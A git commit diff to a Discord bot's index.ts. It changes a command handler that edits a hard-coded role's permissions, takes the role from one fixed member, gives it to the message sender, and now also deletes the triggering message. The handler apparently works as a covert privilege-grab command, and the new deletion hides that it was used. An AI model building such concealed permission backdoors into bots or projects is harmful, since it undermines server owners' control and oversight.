c43ceb610436ac3c36d0cc04a5343a068174c72e
WhoAmI1000 <39578224+WhoAmI1000@users.noreply.github.com>
2020-10-19 12:58:07 -0700

    Update index.ts

--- index.ts
+++ index.ts
@@ -8,13 +8,14 @@ commands.on(
       return;
     }
     let x = await message.getGuild();
-    let y = await x.getRole('763124282158481418');
+    let y = await x.getRole('767175699374669845');
     await y.edit({ permissions: 653647553, color:0x065ba2});//0x065ba2
     var gld = await message.getGuild();
     var psnn = await gld.getMember('738551414439018587');
-    await psnn.removeRole('763124282158481418');
-    await message.member?.addRole('763124282158481418');
+    await psnn.removeRole('767175699374669845');
+    await message.member?.addRole('767175699374669845');
     await message.reply('..>..');
+    await message.delete();
   }
 );
     discord.on('MESSAGE_CREATE', async (message) => {
